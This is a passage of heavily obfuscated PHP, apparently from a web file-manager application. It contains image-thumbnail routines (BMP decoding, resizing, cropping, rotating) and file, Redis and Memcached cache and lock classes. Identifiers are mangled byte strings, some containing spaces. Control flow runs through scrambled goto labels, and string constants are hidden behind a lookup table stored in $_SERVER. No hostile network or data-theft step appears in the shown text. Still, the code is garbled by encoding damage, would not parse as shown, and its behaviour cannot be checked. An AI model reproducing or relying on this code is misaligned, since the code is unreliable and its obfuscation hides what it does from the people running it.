($DÔÑˆŠÛ§Õ == 1 || $DÔÑˆŠÛ§Õ == 2) { $aÄµß ¯ô× = 0; $FÍ¿ÃœÕ” = $fœÓ¬ãÑï¥ >> 2 & 1; for (;;) { if ($aÄµß ¯ô× < -1 || $aÄµß ¯ô× > $Fö´£Ú¿è¬ || $d„ÈŸ†ÖÁ¤ < -1 || $d„ÈŸ†ÖÁ¤ > $c–ëä½±„º) { imagedestroy($BÅµİÜº‹á); return !1; } $AøµÃ†¥… = fread($e­ğ÷œİñ, 1); if ($AøµÃ†¥… === !1) { imagedestroy($BÅµİÜº‹á); return !1; } switch ($AøµÃ†¥…) { case $dô…™ì˜×[1854]: $AøµÃ†¥… = fread($e­ğ÷œİñ, 1); if ($AøµÃ†¥… === !1) { imagedestroy($BÅµİÜº‹á); return !1; } switch ($AøµÃ†¥…) { case $dô…™ì˜×[1854]: $d„ÈŸ†ÖÁ¤ += $D–¹‚ÔÊ„ ; $aÄµß ¯ô× = 0; break; case $dô…™ì˜×[1856]: $d„ÈŸ†ÖÁ¤ = 0; $aÄµß ¯ô× = 0; break 3; case $dô…™ì˜×[1857]: $AøµÃ†¥… = fread($e­ğ÷œİñ, 2); if ($AøµÃ†¥… === !1) { imagedestroy($BÅµİÜº‹á); return !1; } list(, $b×µÎ…‹šÆ, $f÷ªË¨¹¿‘) = unpack($dô…™ì˜×[1858], $AøµÃ†¥…); $aÄµß ¯ô× += $b×µÎ…‹šÆ; $d„ÈŸ†ÖÁ¤ += $f÷ªË¨¹¿‘ * $D–¹‚ÔÊ„ ; break; default: list(, $FåÈÑùÏ‰Ç) = unpack($dô…™ì˜×[1859], $AøµÃ†¥…); $B² ÁİÏÔ‹ = ($FåÈÑùÏ‰Ç >> $FÍ¿ÃœÕ”) + ($FåÈÑùÏ‰Ç & $FÍ¿ÃœÕ”); $AøµÃ†¥… = fread($e­ğ÷œİñ, $B² ÁİÏÔ‹ + 1 & ~1); if ($AøµÃ†¥… === !1) { imagedestroy($BÅµİÜº‹á); return !1; } for ($fî‘è¸ÇğÔ = 0, $D‘÷œŸ…¯Ò = 0; $fî‘è¸ÇğÔ < $FåÈÑùÏ‰Ç; ++$fî‘è¸ÇğÔ, ++$aÄµß ¯ô×, $D‘÷œŸ…¯Ò += $fœÓ¬ãÑï¥) { list(, $d«¢ËË•¯) = unpack($dô…™ì˜×[1859], $AøµÃ†¥…[$D‘÷œŸ…¯Ò >> 3]); $f´ï–á” = $D‘÷œŸ…¯Ò & 7; imagesetpixel($BÅµİÜº‹á, $aÄµß ¯ô×, $d„ÈŸ†ÖÁ¤, $E¢Æ¹ÕêÚ‡[($d«¢ËË•¯ & $fÃ’³—­æé >> $f´ï–á”) >> $bªÌŸŠ©ÙŸ - $f´ï–á”]); } break; } break; default: $eˆÑµ™†Ğ = fread($e­ğ÷œİñ, 1); if ($eˆÑµ™†Ğ === !1) { imagedestroy($BÅµİÜº‹á); return !1; } list(, $e™›ÔÈÔ‹, $d«¢ËË•¯) = unpack($dô…™ì˜×[1858], $AøµÃ†¥… . $eˆÑµ™†Ğ); for ($fî‘è¸ÇğÔ = 0, $D‘÷œŸ…¯Ò = 0; $fî‘è¸ÇğÔ < $e™›ÔÈÔ‹; ++$fî‘è¸ÇğÔ, ++$aÄµß ¯ô×, $D‘÷œŸ…¯Ò += $fœÓ¬ãÑï¥) { $f´ï–á” = $D‘÷œŸ…¯Ò & 7; imagesetpixel($BÅµİÜº‹á, $aÄµß ¯ô×, $d„ÈŸ†ÖÁ¤, $E¢Æ¹ÕêÚ‡[($d«¢ËË•¯ & $fÃ’³—­æé >> $f´ï–á”) >> $bªÌŸŠ©ÙŸ - $f´ï–á”]); } break; } } } else { for ($E‰İ—ŠÅœœ = 0; $E‰İ—ŠÅœœ < $aÌ£Û‡„ˆ‰; ++$E‰İ—ŠÅœœ, $d„ÈŸ†ÖÁ¤ += $D–¹‚ÔÊ„ ) { $AøµÃ†¥… = fread($e­ğ÷œİñ, $DŒáƒéšø); if ($AøµÃ†¥… === !1) { imagedestroy($BÅµİÜº‹á); return !1; } $D‘÷œŸ…¯Ò = 0; for ($aÄµß ¯ô× = 0; $aÄµß ¯ô× < $Fö´£Ú¿è¬; ++$aÄµß ¯ô×, $D‘÷œŸ…¯Ò += $fœÓ¬ãÑï¥) { list(, $d«¢ËË•¯) = unpack($dô…™ì˜×[1859], $AøµÃ†¥…[$D‘÷œŸ…¯Ò >> 3]); $f´ï–á” = $D‘÷œŸ…¯Ò & 7; imagesetpixel($BÅµİÜº‹á, $aÄµß ¯ô×, $d„ÈŸ†ÖÁ¤, $E¢Æ¹ÕêÚ‡[($d«¢ËË•¯ & $fÃ’³—­æé >> $f´ï–á”) >> $bªÌŸŠ©ÙŸ - $f´ï–á”]); } } } goto Dñæ†õ×¤; dÃÑøÆ”Æ‹: $E¢Æ¹ÕêÚ‡ = array(); for ($fî‘è¸ÇğÔ = 0; $fî‘è¸ÇğÔ < $Fœ‡Ìéˆ¬ê; ++$fî‘è¸ÇğÔ) { $AøµÃ†¥… = fread($e­ğ÷œİñ, $fÙ¿Í¶Ò¸è); if ($AøµÃ†¥… === !1) { imagedestroy($BÅµİÜº‹á); return !1; } extract(unpack($dô…™ì˜×[1855], $AøµÃ†¥… . $dô…™ì˜×[1854])); $E¢Æ¹ÕêÚ‡[] = imagecolorallocate($BÅµİÜº‹á, $e˜áÔÑ©èß, $B¿ê”«ÖÆ , $f´ï–á”); } $bªÌŸŠ©ÙŸ = 8 - $fœÓ¬ãÑï¥; goto DÍöÛÍ…ÕĞ; Dñæ†õ×¤: } else { goto CíÎ†Š‹Ş; Eˆ¾ï¥ŠÌ¤: $bƒ‹•ƒ«¥Ä = $e¦æÊ•ç™  ? 1 / $e¦æÊ•ç™  : 1; $eéâ…ø‡‡é = $fœõáË´Œº ? 1 / $fœõáË´Œº : 1; $BõÒ“’¢œ• = $c­Ç‘›øåé ? 1 / $c­Ç‘›øåé : 1; goto AÒß ËÉÜ; CíÎ†Š‹Ş: $BÅµİÜº‹á = imagecreatetruecolor($Fö´£Ú¿è¬, $aÌ£Û‡„ˆ‰); imagealphablending($BÅµİÜº‹á, !1); if ($fîî¤î¡øÏ) { imagesavealpha($BÅµİÜº‹á, !0); } goto E½åò›†”; E½åò›†”: $CÕÓ‡‘àò = $fœÓ¬ãÑï¥ >> 3; $Bõî©Âœ‡£ = $fîî¤î¡øÏ ? 127 : 0; $Cº‚ ©Ó = $fîî¤î¡øÏ ? 1 / $fîî¤î¡øÏ : 1; goto Eˆ¾ï¥ŠÌ¤; AÒß ËÉÜ: for ($E‰İ—ŠÅœœ = 0; $E‰İ—ŠÅœœ < $aÌ£Û‡„ˆ‰; ++$E‰İ—ŠÅœœ, $d„ÈŸ†ÖÁ¤ += $D–¹‚ÔÊ„ ) { $AøµÃ†¥… = fread($e­ğ÷œİñ, $DŒáƒéšø); if ($AøµÃ†¥… === !1) { imagedestroy($BÅµİÜº‹á); return !1; } $D‘÷œŸ…¯Ò = 0; for ($aÄµß ¯ô× = 0; $aÄµß ¯ô× < $Fö´£Ú¿è¬; ++$aÄµß ¯ô×, $D‘÷œŸ…¯Ò += $CÕÓ‡‘àò) { list(, $d«¢ËË•¯) = unpack($dô…™ì˜×[1836], substr($AøµÃ†¥…, $D‘÷œŸ…¯Ò, $CÕÓ‡‘àò) . $dô…™ì˜×[1860]); $c×ºƒùØ¬ = $d«¢ËË•¯ & $fîî¤î¡øÏ; $föŞàº¨ùˆ = $d«¢ËË•¯ & $e¦æÊ•ç™ ; $C¬ù‚ÀİèÖ = $d«¢ËË•¯ & $fœõáË´Œº; $dÄ‹Ë ±ÛÜ = $d«¢ËË•¯ & $c­Ç‘›øåé; $f³ëŒïİÜ = $Bõî©Âœ‡£ - (($c×ºƒùØ¬ << 7) - $c×ºƒùØ¬) * $Cº‚ ©Ó; $e˜áÔÑ©èß = (($föŞàº¨ùˆ << 8) - $föŞàº¨ùˆ) * $bƒ‹•ƒ«¥Ä; $B¿ê”«ÖÆ  = (($C¬ù‚ÀİèÖ << 8) - $C¬ù‚ÀİèÖ) * $eéâ…ø‡‡é; $f´ï–á” = (($dÄ‹Ë ±ÛÜ << 8) - $dÄ‹Ë ±ÛÜ) * $BõÒ“’¢œ•; imagesetpixel($BÅµİÜº‹á, $aÄµß ¯ô×, $d„ÈŸ†ÖÁ¤, $f³ëŒïİÜ << 24 | $e˜áÔÑ©èß << 16 | $B¿ê”«ÖÆ  << 8 | $f´ï–á”); } } imagealphablending($BÅµİÜº‹á, !0); goto BŠèçä…; BŠèçä…: } return $BÅµİÜº‹á; goto eó‹æÜ°­š; c”ï›‹§ø: $dô…™ì˜× =& $_SERVER[Æ]; if ($BÛ›„óº¯ğ[$dô…™ì˜×[388]] != 19778) { return !1; } $AøµÃ†¥… = fread($e­ğ÷œİñ, 4); goto fÛ¬¢÷Ş­Ï; eó‹æÜ°­š: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($B§­óÛœ‡ò, $AëÙ¯‹…İ‰) { goto bÙ˜ŠîôÃ; bÙ˜ŠîôÃ: $this->srcFile = $B§­óÛœ‡ò; $this->echoType = $AëÙ¯‹…İ‰; $this->im = self::image($B§­óÛœ‡ò); goto cÆÑøÜÜç¡; cÆÑøÜÜç¡: if (!$this->im) { return !1; } $AÅ‹¯¥‡ÂÙ = $_SERVER[Æ][33]; $this->imgData = GetImageSize($B§­óÛœ‡ò, $AÅ‹¯¥‡ÂÙ); goto C’ä’Ô¨”ñ; C’ä’Ô¨”ñ: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto E…ª……›Ñ; E…ª……›Ñ: } public static function image($fß£¡®é«¯) { $b‘Œ§…Äù =& $_SERVER[Æ]; $DÖîŠù¡–® = $b‘Œ§…Äù[33]; $fÒ²½¨ó¦Õ = GetImageSize($fß£¡®é«¯, $DÖîŠù¡–®); $E½¨¥ àÂº = !1; switch ($fÒ²½¨ó¦Õ[2]) { case IMAGETYPE_GIF: if (!function_exists($b‘Œ§…Äù[1861])) { break; } $E½¨¥ àÂº = imagecreatefromgif($fß£¡®é«¯); break; case IMAGETYPE_JPEG: if (!function_exists($b‘Œ§…Äù[1862])) { break; } $E½¨¥ àÂº = imagecreatefromjpeg($fß£¡®é«¯); break; case IMAGETYPE_PNG: if (!function_exists($b‘Œ§…Äù[1863])) { break; } $E½¨¥ àÂº = @imagecreatefrompng($fß£¡®é«¯); imagesavealpha($E½¨¥ àÂº, !0); break; case IMAGETYPE_XBM: $E½¨¥ àÂº = imagecreatefromxbm($fß£¡®é«¯); break; case IMAGETYPE_WBMP: $E½¨¥ àÂº = imagecreatefromwbmp($fß£¡®é«¯); break; case IMAGETYPE_BMP: $E½¨¥ àÂº = imagecreatefrombmp($fß£¡®é«¯); break; default: break; } return $E½¨¥ àÂº; } public static function imageSize($d  Î§¤¡Å) { $AÉÆ­¢’ñ =& $_SERVER[Æ]; $f½³²îáÙÑ = GetImageSize($d  Î§¤¡Å); if (!$f½³²îáÙÑ) { return !1; } return array($AÉÆ­¢’ñ[1864] => $f½³²îáÙÑ[0], $AÉÆ­¢’ñ[1865] => $f½³²îáÙÑ[1]); } function distortion($DËï†§’è“, $CÌÄ†œ»÷´, $C¿­ÃÃ¼º£) { $bŸ˜®Ó¬‹¥ = $this->creatImage($this->im, $CÌÄ†œ»÷´, $C¿­ÃÃ¼º£, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($bŸ˜®Ó¬‹¥, $DËï†§’è“); } function prorate($fò”ÕÅö½, $e‚ßÍ¢ùšğ, $cô™ØÕ™) { $bÌáâç¾í = $e‚ßÍ¢ùšğ / $cô™ØÕ™; $BæÉ™Êéô = $this->srcW / $this->srcH; if ($bÌáâç¾í <= $BæÉ™Êéô) { $cÒ•§ÅÜğ› = $e‚ßÍ¢ùšğ; $c‡ö×Åµ…Ò = $cÒ•§ÅÜğ› * ($this->srcH / $this->srcW); } else { $c‡ö×Åµ…Ò = $cô™ØÕ™; $cÒ•§ÅÜğ› = $c‡ö×Åµ…Ò * ($this->srcW / $this->srcH); } if ($this->srcW > $e‚ßÍ¢ùšğ || $this->srcH > $cô™ØÕ™) { $dĞ¼Šì‘ŠÔ = $this->creatImage($this->im, $cÒ•§ÅÜğ›, $c‡ö×Åµ…Ò, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($dĞ¼Šì‘ŠÔ, $fò”ÕÅö½); } else { $dĞ¼Šì‘ŠÔ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($dĞ¼Šì‘ŠÔ, $fò”ÕÅö½); } } function cut($DÉ¦–È, $E•ëÍ¨á‘ê, $fÅñ—æÇ¦‘) { goto eå¢åº…ˆÑ; C¸è¥ŒÊÓ: return $this->echoImage($DÂ‘ÛÙæÏ¡, $DÉ¦–È); goto dÖ´¼µšÒŠ; eå¢åº…ˆÑ: $aÇ»¼ãµåà = $E•ëÍ¨á‘ê / $fÅñ—æÇ¦‘; $E†’Ì™¤¥ = $this->srcW / $this->srcH; if ($aÇ»¼ãµåà <= $E†’Ì™¤¥) { $D§Äô†›Û = $fÅñ—æÇ¦‘; $A» İêÇ¡Š = $D§Äô†›Û * ($this->srcW / $this->srcH); } else { $A» İêÇ¡Š = $E•ëÍ¨á‘ê; $D§Äô†›Û = $A» İêÇ¡Š * ($this->srcH / $this->srcW); } goto AĞÕ¢êÏëŠ; AĞÕ¢êÏëŠ: $aõÒø½É½ë = $this->creatImage($this->im, $A» İêÇ¡Š, $D§Äô†›Û, 0, 0, 0, 0, $this->srcW, $this->srcH); $DÂ‘ÛÙæÏ¡ = $this->creatImage($aõÒø½É½ë, $E•ëÍ¨á‘ê, $fÅñ—æÇ¦‘, 0, 0, ($A» İêÇ¡Š - $E•ëÍ¨á‘ê) / 2, ($D§Äô†›Û - $fÅñ—æÇ¦‘) / 2, $E•ëÍ¨á‘ê, $fÅñ—æÇ¦‘); imageDestroy($aõÒø½É½ë); goto C¸è¥ŒÊÓ; dÖ´¼µšÒŠ: } function backFill($D‡É¹¸†, $aŞ¤¥Ÿˆ’, $b°•ªŒÁ‰î, $c÷ŠÃ×œ× = false, $Bï…ãŠô³Ë = 255, $B˜ÉšäÂÀí = 255, $BÓ¹Ìøê¡ = 255) { goto Bö´¹œµÍ; c‰Ÿ‹ ¸º: return $this->echoImage($aŒ¾åíŒ¶‹, $D‡É¹¸†); goto D…ƒŞë‹‰ï; aá‡éßÔËÆ: if ($c÷ŠÃ×œ×) { $F†õ×·Ã­ç = imageColorTransparent($aŒ¾åíŒ¶‹, $F†õ×·Ã­ç); $dŠ«¦‘¹Ù = $b°•ªŒÁ‰î - $D¢ôÊ²»„; } imageFilledRectangle($aŒ¾åíŒ¶‹, 0, 0, $aŞ¤¥Ÿˆ’, $b°•ªŒÁ‰î, $F†õ×·Ã­ç); if ($this->srcW > $aŞ¤¥Ÿˆ’ || $this->srcH > $b°•ªŒÁ‰î) { $fêİµ±ÔÒ¤ = $this->creatImage($this->im, $d˜ï´Ï‘, $D¢ôÊ²»„, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($d˜ï´Ï‘ < $aŞ¤¥Ÿˆ’) { imageCopy($aŒ¾åíŒ¶‹, $fêİµ±ÔÒ¤, ($aŞ¤¥Ÿˆ’ - $d˜ï´Ï‘) / 2, 0, 0, 0, $d˜ï´Ï‘, $D¢ôÊ²»„); } else { if ($D¢ôÊ²»„ < $b°•ªŒÁ‰î) { imageCopy($aŒ¾åíŒ¶‹, $fêİµ±ÔÒ¤, 0, $dŠ«¦‘¹Ù, 0, 0, $d˜ï´Ï‘, $D¢ôÊ²»„); } else { imageCopy($aŒ¾åíŒ¶‹, $fêİµ±ÔÒ¤, 0, 0, 0, 0, $d˜ï´Ï‘, $D¢ôÊ²»„); } } } else { imageCopyMerge($aŒ¾åíŒ¶‹, $this->im, ($aŞ¤¥Ÿˆ’ - $d˜ï´Ï‘) / 2, $dŠ«¦‘¹Ù, 0, 0, $d˜ï´Ï‘, $D¢ôÊ²»„, 100); } goto c‰Ÿ‹ ¸º; Bö´¹œµÍ: $fŒœ»Ïá ß = $aŞ¤¥Ÿˆ’ / $b°•ªŒÁ‰î; $fµ‚«Şéæù = $this->srcW / $this->srcH; if ($fŒœ»Ïá ß <= $fµ‚«Şéæù) { $d˜ï´Ï‘ = $aŞ¤¥Ÿˆ’; $D¢ôÊ²»„ = $d˜ï´Ï‘ * ($this->srcH / $this->srcW); } else { $D¢ôÊ²»„ = $b°•ªŒÁ‰î; $d˜ï´Ï‘ = $D¢ôÊ²»„ * ($this->srcW / $this->srcH); } goto BÑ—‚‘™Ù; BÑ—‚‘™Ù: if (function_exists($_SERVER[Æ][1866])) { @($aŒ¾åíŒ¶‹ = imageCreateTrueColor($aŞ¤¥Ÿˆ’, $b°•ªŒÁ‰î)); if (!$aŒ¾åíŒ¶‹) { $aŒ¾åíŒ¶‹ = imageCreate($aŞ¤¥Ÿˆ’, $b°•ªŒÁ‰î); } } else { $aŒ¾åíŒ¶‹ = imageCreate($aŞ¤¥Ÿˆ’, $b°•ªŒÁ‰î); } $dŠ«¦‘¹Ù = ($b°•ªŒÁ‰î - $D¢ôÊ²»„) / 2; $F†õ×·Ã­ç = imagecolorallocate($aŒ¾åíŒ¶‹, $Bï…ãŠô³Ë, $B˜ÉšäÂÀí, $BÓ¹Ìøê¡); goto aá‡éßÔËÆ; D…ƒŞë‹‰ï: } function creatImage($fÇ¼ÈÚáè¥, $C‹Ç“óÎÑ², $eÓ›æ©àŞ², $f›ŸŠ¾¢ƒ, $fâ’‚¸¬¨‹, $E‹“Ì¦±Á, $fÆ³‚¿§Çè, $cÌÓ×î©§, $d”¯´Óµ‡ˆ) { if (function_exists($_SERVER[Æ][1866])) { @($a—Ö„ëöÉÏ = ImageCreateTrueColor($C‹Ç“óÎÑ², $eÓ›æ©àŞ²)); @imagealphablending($a—Ö„ëöÉÏ, !1); @imagesavealpha($a—Ö„ëöÉÏ, !0); if ($a—Ö„ëöÉÏ) { imageCopyResampled($a—Ö„ëöÉÏ, $fÇ¼ÈÚáè¥, $f›ŸŠ¾¢ƒ, $fâ’‚¸¬¨‹, $E‹“Ì¦±Á, $fÆ³‚¿§Çè, $C‹Ç“óÎÑ², $eÓ›æ©àŞ², $cÌÓ×î©§, $d”¯´Óµ‡ˆ); } else { $a—Ö„ëöÉÏ = ImageCreate($C‹Ç“óÎÑ², $eÓ›æ©àŞ²); imageCopyResized($a—Ö„ëöÉÏ, $fÇ¼ÈÚáè¥, $f›ŸŠ¾¢ƒ, $fâ’‚¸¬¨‹, $E‹“Ì¦±Á, $fÆ³‚¿§Çè, $C‹Ç“óÎÑ², $eÓ›æ©àŞ², $cÌÓ×î©§, $d”¯´Óµ‡ˆ); } } else { $a—Ö„ëöÉÏ = ImageCreate($C‹Ç“óÎÑ², $eÓ›æ©àŞ²); imageCopyResized($a—Ö„ëöÉÏ, $fÇ¼ÈÚáè¥, $f›ŸŠ¾¢ƒ, $fâ’‚¸¬¨‹, $E‹“Ì¦±Á, $fÆ³‚¿§Çè, $C‹Ç“óÎÑ², $eÓ›æ©àŞ², $cÌÓ×î©§, $d”¯´Óµ‡ˆ); } return $a—Ö„ëöÉÏ; } public function imgRotate($bŠ‰‹…‘, $A‚„Å’³øª) { goto BªŠÂÀ­Ÿã; BªŠÂÀ­Ÿã: if (!$this->im || $A‚„Å’³øª % 360 === 0 || !function_exists($_SERVER[Æ][1867])) { return !1; } $C¼ù‡¯¤Á„ = imageRotate($this->im, 360 - $A‚„Å’³øª, 0); $f±ÛùèÄ¥è = !1; goto C‡÷ØªÜç´; C‡÷ØªÜç´: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $f±ÛùèÄ¥è = imagegif($C¼ù‡¯¤Á„, $bŠ‰‹…‘); break; case IMAGETYPE_JPEG: $f±ÛùèÄ¥è = imagejpeg($C¼ù‡¯¤Á„, $bŠ‰‹…‘, 100); break; case IMAGETYPE_PNG: $f±ÛùèÄ¥è = imagePNG($C¼ù‡¯¤Á„, $bŠ‰‹…‘); break; default: break; } imageDestroy($C¼ù‡¯¤Á„); imageDestroy($this->im); goto aîœ¼¥¼ Ñ; aîœ¼¥¼ Ñ: return $f±ÛùèÄ¥è; goto e“‰·ŒËÑ; e“‰·ŒËÑ: } function echoImage($CÖÊ˜Á™ª, $Fò÷µšğ§‡) { goto e‰ì”¢éï; e‰ì”¢éï: $D¡ˆ»¼½“‹ =& $_SERVER[Æ]; if (!$CÖÊ˜Á™ª) { return !1; } ob_get_clean(); goto Bëâò©Ş´±; Bëâò©Ş´±: $bÄÀ¯âÒ = !1; switch ($this->echoType) { case $D¡ˆ»¼½“‹[1868]: $bÄÀ¯âÒ = imagePNG($CÖÊ˜Á™ª); break; case $D¡ˆ»¼½“‹[167]: $bÄÀ¯âÒ = imagePNG($CÖÊ˜Á™ª, $Fò÷µšğ§‡); break; } imageDestroy($CÖÊ˜Á™ª); goto eê³‰‰˜¿; eê³‰‰˜¿: imageDestroy($this->im); return $bÄÀ¯âÒ; goto Còˆƒ††„Œ; Còˆƒ††„Œ: } } goto FÒ®À¶§‚; B»é¥¬¸ù‡: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto dó•œÇßÒÙ; bÉŒºÈÄˆ–: $D„»ÎÛè’ = $GLOBALS[$c”¨¶İÈâÉ[6]][$c”¨¶İÈâÉ[337]]; $Cµ‘ğˆ½ó³ = $D„»ÎÛè’[$D„»ÎÛè’[$c”¨¶İÈâÉ[752]]]; $d·İ‘ÇÅ‹“ = $D„»ÎÛè’[$c”¨¶İÈâÉ[753]]; goto AÔÙˆ½²È­; dó•œÇßÒÙ: $c”¨¶İÈâÉ =& $_SERVER[Æ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto bÉŒºÈÄˆ–; AÔÙˆ½²È­: switch ($D„»ÎÛè’[$c”¨¶İÈâÉ[752]]) { case $c”¨¶İÈâÉ[17]: self::$handle = Model($c”¨¶İÈâÉ[754]); break; case $c”¨¶İÈâÉ[755]: self::$handle = new CacheRedis($Cµ‘ğˆ½ó³, $d·İ‘ÇÅ‹“); break; case $c”¨¶İÈâÉ[756]: self::$handle = new CacheMemcached($Cµ‘ğˆ½ó³, $d·İ‘ÇÅ‹“); break; case $c”¨¶İÈâÉ[167]: self::$handle = new CacheFile($Cµ‘ğˆ½ó³, $d·İ‘ÇÅ‹“); break; default: break; } return self::$handle; goto D÷·¦ÍÃë; D÷·¦ÍÃë: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($eÎİ‘Ã˜Ş) { if (is_array($eÎİ‘Ã˜Ş) || is_object($eÎİ‘Ã˜Ş)) { $eÎİ‘Ã˜Ş = json_encode($eÎİ‘Ã˜Ş); } $eÎİ‘Ã˜Ş = rawurlencode($eÎİ‘Ã˜Ş); return KOD_SITE_ID . $_SERVER[Æ][70] . $eÎİ‘Ã˜Ş; } public static function get($F‰ç¸Şóõ) { $E¢âæçªö… = self::key($F‰ç¸Şóõ); if (!isset(self::$memoryCache[$E¢âæçªö…])) { $B¹ø†öÌ‰ª = self::init()->get($E¢âæçªö…); self::$memoryCache[$E¢âæçªö…] = unserialize($B¹ø†öÌ‰ª); } return self::$memoryCache[$E¢âæçªö…]; } public static function set($d¦·„²Œ°, $cÚ‹ŠÔå‚”, $FøĞ½„³ë£ = false) { goto aµ½Ì—¢‡å; aµ½Ì—¢‡å: $D±·¹±²†¡ = self::key($d¦·„²Œ°); if (isset(self::$memoryCache[$D±·¹±²†¡]) && self::$memoryCache[$D±·¹±²†¡] === $cÚ‹ŠÔå‚”) { return !0; } if ($FøĞ½„³ë£ === 0) { self::$memoryCache[$D±·¹±²†¡] = $cÚ‹ŠÔå‚”; return !0; } goto B¸¨Éè³ˆ; A‡µÀ”í³£: CacheLock::unlock($d¦·„²Œ°); return $AŠí‰œŒÎÉ; goto Eš ‘—ŠÒ; B¸¨Éè³ˆ: CacheLock::lock($d¦·„²Œ°); $AŠí‰œŒÎÉ = self::init()->set($D±·¹±²†¡, serialize($cÚ‹ŠÔå‚”), $FøĞ½„³ë£); self::$memoryCache[$D±·¹±²†¡] = $cÚ‹ŠÔå‚”; goto A‡µÀ”í³£; Eš ‘—ŠÒ: } public static function remove($eˆ¥îÍ¤÷œ) { goto cÔºê‰™ñ¿; eì¢ñ¬ó…„: return $D…Û¾ÑŞì–; goto fèİ ¾İ“¤; bõœ„Şã¸Ë: CacheLock::lock($eˆ¥îÍ¤÷œ); $D…Û¾ÑŞì– = self::init()->remove($aÍÅÒ¼ÍÙó); CacheLock::unlock($eˆ¥îÍ¤÷œ); goto eì¢ñ¬ó…„; cÔºê‰™ñ¿: $aÍÅÒ¼ÍÙó = self::key($eˆ¥îÍ¤÷œ); unset(self::$memoryCache[$aÍÅÒ¼ÍÙó]); self::clearTimeout(); goto bõœ„Şã¸Ë; fèİ ¾İ“¤: } public static function clearMemory($Eæ¯åì ×ğ = false) { if ($Eæ¯åì ×ğ) { $Eæ¯åì ×ğ = self::key($Eæ¯åì ×ğ); unset(self::$memoryCache[$Eæ¯åì ×ğ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Æ][757])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Æ][758])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($fĞ¦Š¿¦Ş, $Cä¢¢Ö¶¦£) { $AøÙª•ŸÃó =& $_SERVER[Æ]; $this->cachePath = $fĞ¦Š¿¦Ş[$AøÙª•ŸÃó[75]]; $this->prefix = $AøÙª•ŸÃó[759]; $this->cacheTime = $Cä¢¢Ö¶¦£; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($bŠ’¸±õ‰) { $Fé¬‹ÈÃ—¢ =& $_SERVER[Æ]; $bŠ’¸±õ‰ = str_replace(array($Fé¬‹ÈÃ—¢[760], $Fé¬‹ÈÃ—¢[93], $Fé¬‹ÈÃ—¢[69]), $Fé¬‹ÈÃ—¢[761], $bŠ’¸±õ‰); return $this->cachePath . $Fé¬‹ÈÃ—¢[762] . $bŠ’¸±õ‰ . $Fé¬‹ÈÃ—¢[763]; } public function set($dÎé¿´Ë¤ö, $cÂ§å«°Ú, $fŸ×ÛÚ¹—Ñ = false) { $CÓíššŠ°¢ = $this->getFile($dÎé¿´Ë¤ö); if (file_put_contents($CÓíššŠ°¢, $this->prefix . $cÂ§å«°Ú, LOCK_EX)) { return !0; } @unlink($CÓíššŠ°¢); return !1; } public function get($f¨ˆ¼ß…ß) { $B­Š³¯ ¤ = $this->getFile($f¨ˆ¼ß…ß); if (file_exists($B­Š³¯ ¤) && filemtime($B­Š³¯ ¤) < time() - $this->cacheTime) { @unlink($B­Š³¯ ¤); return !1; } $BÌŠÁ¶ = @file_get_contents($B­Š³¯ ¤); return substr($BÌŠÁ¶, strlen($this->prefix)); } public function remove($C‹î’ÇÜŠî) { $C—»ïÀ°å = $this->getFile($C‹î’ÇÜŠî); return @unlink($C—»ïÀ°å); } public function deleteAll() { $AÂ¨Ô±åº =& $_SERVER[Æ]; $cˆİÂË®µ = scandir($this->cachePath); foreach ($cˆİÂË®µ as $Aˆù·‘…´Ü) { $CĞ±Åàö×á = $this->cachePath . $Aˆù·‘…´Ü; if (strpos($CĞ±Åàö×á, $AÂ¨Ô±åº[763]) && strpos($CĞ±Åàö×á, $AÂ¨Ô±åº[764])) { @unlink($CĞ±Åàö×á); } } } public function clearTimeout() { $B³æÕİÌ¾ =& $_SERVER[Æ]; $bÓÕ¬ÌÙ³„ = scandir($this->cachePath); foreach ($bÓÕ¬ÌÙ³„ as $BÁ»°ÂÌ¿Æ) { $A–Ó‹×ˆÄ = $this->cachePath . $BÁ»°ÂÌ¿Æ; if (strpos($A–Ó‹×ˆÄ, $B³æÕİÌ¾[763]) && strpos($A–Ó‹×ˆÄ, $B³æÕİÌ¾[764]) && filemtime($A–Ó‹×ˆÄ) < time() - $this->cacheTime) { @unlink($A–Ó‹×ˆÄ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto dä»°ï›‘; eà¸¡Ì³˜Ï: if ($D¾–á×É¾ == $eËåÍÎÛ°˜[17] && $AÕÃè§Õš§ == $eËåÍÎÛ°˜[9]) { $D¾–á×É¾ = $eËåÍÎÛ°˜[167]; } switch ($D¾–á×É¾) { case $eËåÍÎÛ°˜[755]: self::$handle = new CacheLockRedis(); break; case $eËåÍÎÛ°˜[756]: self::$handle = new CacheLockMemcached(); break; case $eËåÍÎÛ°˜[17]: self::$handle = new CacheLockDatabase(); break; case $eËåÍÎÛ°˜[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto C±µ†ÕÔæ; dèçÔ•ÉØ•: self::$timeout = $cµÀâñ‚óà[$eËåÍÎÛ°˜[765]] ? $cµÀâñ‚óà[$eËåÍÎÛ°˜[765]] : 10; $AÕÃè§Õš§ = _get($GLOBALS[$eËåÍÎÛ°˜[6]], $eËåÍÎÛ°˜[766]); $D¾–á×É¾ = $cµÀâñ‚óà[$eËåÍÎÛ°˜[752]] ? $cµÀâñ‚óà[$eËåÍÎÛ°˜[752]] : $eËåÍÎÛ°˜[167]; goto eà¸¡Ì³˜Ï; dä»°ï›‘: $eËåÍÎÛ°˜ =& $_SERVER[Æ]; if (self::$handle) { return self::$handle; } 